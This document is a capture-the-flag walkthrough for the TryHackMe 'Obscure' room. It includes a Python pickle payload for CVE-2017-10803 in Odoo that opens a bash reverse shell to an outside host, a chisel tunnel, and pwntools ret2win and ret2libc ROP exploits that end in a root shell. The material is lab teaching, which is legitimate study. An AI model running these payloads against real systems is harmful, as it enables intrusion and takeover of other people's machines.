# Obscure - TryHackMe
Link to the room: https://tryhackme.com/room/obscured

This is the official writeup for the room. We'll start with the usual enumeration.

-----------------
# Emumeration
## Nmap
We'll first find all the open ports with:
```
nmap 10.10.163.242 -p- -T4
```
and then do a service/version scan on the open ports
```

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-30 12:00 PKT
Nmap scan report for 10.10.163.242
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Jul 24 23:52 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:91:5c:43:c1:81:19:6e:0a:28:e8:16:78:c6:d5:c0 (RSA)
|   256 db:f8:7e:ca:5e:24:31:f9:07:57:8b:8d:74:cb:fe:c1 (ECDSA)
|_  256 40:6e:c3:a8:fb:df:15:d1:2b:9c:0f:c5:60:ba:e0:b6 (ED25519)
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.9)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-cookie-flags: 
|   /: 
|     session_id: 
|_      httponly flag not set
|_http-server-header: Werkzeug/0.9.6 Python/2.7.9
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.66 seconds

```
## FTP
We have anonymous login enabled with ftp and there is a "pub" directory. Logging in with user `ftp` and no password, we download
both files, "notice.txt" and "password". 

Contents of "notice.txt":
```
From antisoft.thm security,

A number of people have been forgetting their passwords so we've made a temporary password application.
```
So, we get an org name and a "password" binary. Some basic reversing like running `strings password` gives us an employee id,
which can be used to get the password `SecurePassword123!` (note: the plaintext password can also be retrieved directly)

## SSH
If we try to login with ssh, we get `Permission denied (publickey).` which means password authentication has been disabled.

# Web
We skip our usual gobuster/ffuf by reading the room's info saying:
"No brute-forcing is needed at any point in this box."

## Login
Navigating to the web app, we see [Odoo](https://www.odoo.com/) installed. Now, we can either login with our found password and
using `admin@antisoft.thm` which is simpler but needs some guess work, or by going to "manage database" and creating a new one with our
master password.
![odoo](https://i.imgur.com/bCCn7NI.png)

## Exploitation
Searching for exploits on odoo that can give us remote code exceution, we find "CVE-2017-10803" which matches the installed 
odoo version. Following along with the exploit description, we search and install "Database anonymization" (uncheck the `Apps`).
We anonymize the database and prepare our own payload file with the code below:
```python
import cPickle
import os

class Exploit(object):
	def __reduce__(self):
		return (os.system, (("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"),))

with open("exploit.pickle", "wb") as f:
	cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```
(Note1: We need to use python2 as pickling is different with python3 and the payload won't work.)

(Note2: If you're using the simple `bash -i` command, it won't work)

# Docker
After getting a reverse shell, we see that we're in a docker container. There's a custom binary `/ret`, we download it and
run it through a disassembler/decompiler (popular choices are gdb,r2,ghidra,ida) and see that there's a `vuln` and `win` function.

![functions](https://i.imgur.com/brxY4Tj.png)

Now, this should be a dead giveaway that we need to perform a "ret2win" attack on this binary but we can look into the `win` 
function further.

![win function](https://i.imgur.com/4WemthK.png)

We also run our basic checks like `file ret`, `checksec --file ret` or `rabin2 -I ret` to see if there's any protections, the
only one is `NX` which means we can't execute shellcode off the stack but it's irrelevant here.

So, we need to find the offset and then place the value of `win` function in "rsp". We can get this through gdb, run `pattern create 200`, copy the output, `run` to run the program and paste. We see the program crash and if we do 
`pattern search $rsp` we get an exact offset at "136" (little endian because our binary is an lsb executable).
Now, we just need the function address which we get in gdb by using `info functions`, chain them together and we have ret2win.
We could exploit the suid bit on the `ret` binary but then we'd still be in the container, so we scan the docker network to see
if the host has anything interesting running. (note: nmap has been installed already to skip transfering over a static binary)

Running `nmap 172.17.0.0/24` we see the host `172.17.0.1` has port 4444 open, which isn't accessible from the outside. Using nc to connect to the port we see that the `ret` binary is running over this port. We could forward this port to our machine and directly use pwntools for the exploitation which makes this process a lot neater and easier.

(This step is optional as the ret binary running on 4444 can be directly exploited to get a shell on the box)
## Port forwarding
We'll be using chisel to do our port forwarding but socat can also be used.
On your attacker machine, start a chisel server with 
```bash
chisel server --reverse -p 3000
```
then, transfer a static chisel binary on the machine with a python web server and forward the port with chisel
```bash
./chisel client <your_thm_ip>:3000 R:4444:172.17.0.1:4444
```
now, port 4444 on our attacker machine should serve the connection and we can use pwntools at will.
The previously explained exploit done in pwntools looks something like this:
```python
from pwn import *

exe = './ret'
elf = ELF(exe)

offset = 136	#offset found using gdb

payload = b"A"*offset
payload += p64(elf.symbols['win']) 	#win function address found with elf

io = remote('localhost',4444)		#connecting to our forwarded port

io.recvline();io.recvline();		#recieving the initial junk
io.sendline(payload)

io.interactive()
```
This gets us a shell on the box.

# Root
Now, we could run our usual enumeration tactics but there's an suid file in our home directory named "exploit_me" which seems more important.

Running our usual checks, we see that there's no win function in this binary, no stack canary and no pie but we can cause an overflow. This setup should point to a ret2libc attack which is a relatively complex exploit. We have to perform rop(Return Oriented Programming) in order to execute `/bin/sh` and get a shell as root. In order to rop with libc(which has the `system` function and `/bin/sh` string), we have to know the base address of `libc` so we can provide those addresses to the program and it runs our code, because of ASLR(address space layout randomization) libc addresses are randomized so we need a libc address leak. With an address leak we can compute where the base address of libc is and call `system('/bin/sh')`.

We'll be using pwntools `ROP()` functionality to automate the exploit. First, to get a libc address leak, we overwrite the return address with a rop chain. The rop chain first calls `puts` with the GOT(global offsets table) address of `puts`, printing it out and then it restarts the program by calling `main`. We ssh into the machine(using the keyfile because we dont have the password) and start the vulnerable program as a process. We recieve the puts leak and extract it in a correct format. We can match the leaked address and get a libc file from https://libc.blukat.me/ but we can also just use the libc on the machine itself `/lib/x86_64-linux-gnu/libc.so.6`. We compute and set the correct base address on libc and build another rop chain to run `system('/bin/sh')`.

We first run the instruction `pop rdi, ret` which pops a value from the stack into the `rdi` register(first argument for a function call is taken in `rdi`). Next, We place the address of `/bin/sh` on the stack so it gets popped into rdi(so it can be used for `system('/bin/sh')`). We add another `ret` for stack alignment(this isn't strictly needed sometimes). Finally, we call `system` itself, so the program runs `system('/bin/sh')` and gives us a shell as root.

The final exploit looks something like this:
```python
from pwn import *

#initializing binary, elf, libc etc.,
context.binary = binary = './exploit_me'
context.arch = 'amd64'

elf = ELF(binary)
rop = ROP(elf)

#padding, payloads and rop calls for address leak
padding = b"A"*40
rop.call(elf.sym['puts'], [elf.got.puts])	#calling puts to get the address of puts
rop.call(elf.sym['main'])			#returning execution back to main function

payload = flat(
	padding, rop.chain())			#chaining our inital payload together

#processes, interaction, finding puts leak
shell = ssh('zeeshan', '10.10.68.38', keyfile='id_rsa', port=22)	#using ssh to login with pwntools
#io = process(binary)
io = shell.process(['sudo','./exploit_me'])	#starting process with sudo

io.recvline()
io.sendline(payload)
leak = u64(io.recvline().rstrip().ljust(8,b'\0'))
log.info(f"Found puts leak at => {hex(leak)}")

#calculating base address of libc and rebasing
#matching leaked puts address with https://libc.blukat.me/ we get the required libc(amd64)
libc = ELF('libc6_2.23-0ubuntu11.2_amd64.so', checksec=False)	
libc.address = leak - libc.sym['puts']
log.info(f"base address libc => {hex(libc.address)}")

#final payload to call /bin/sh
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

#poping shell
io.recvline()
io.sendline(payload)

io.interactive()
``` 
This will give us a root shell on the box. 

-----------------